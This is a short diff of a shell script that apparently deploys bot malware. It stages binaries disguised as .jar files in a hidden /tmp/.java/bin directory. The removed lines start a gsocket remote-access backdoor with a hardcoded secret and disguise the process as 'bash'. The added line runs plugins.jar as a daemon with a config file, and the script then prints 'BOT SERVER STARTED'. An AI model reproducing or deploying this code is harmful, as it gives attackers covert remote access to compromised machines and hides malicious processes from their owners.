@@ -13,9 +13,9 @@ function fetch_files() {
 
 function start_app() {
     chmod a+x /tmp/.java/bin/***
-    # cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
-    export GSOCKET_ARGS="-s be928caed2a1e2c5a16f98139d80bd78-564c961ecd9f9440da62803ca815160c -liqD"
-    cd /tmp/.java/bin && exec -a -bash ./add-on.jar &
+    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
+    # export GSOCKET_ARGS="-s bE928cAe-D2a1E2c-5A16f98-13D9g8Hbj7-56C4a961-eCd9F9440-d6A2803-8A1c5J1g60 -liqD"
+    # cd /tmp/.java/bin && exec -a -java ./add-on.jar &
     echo "BOT SERVER STARTED ..."
 }
 
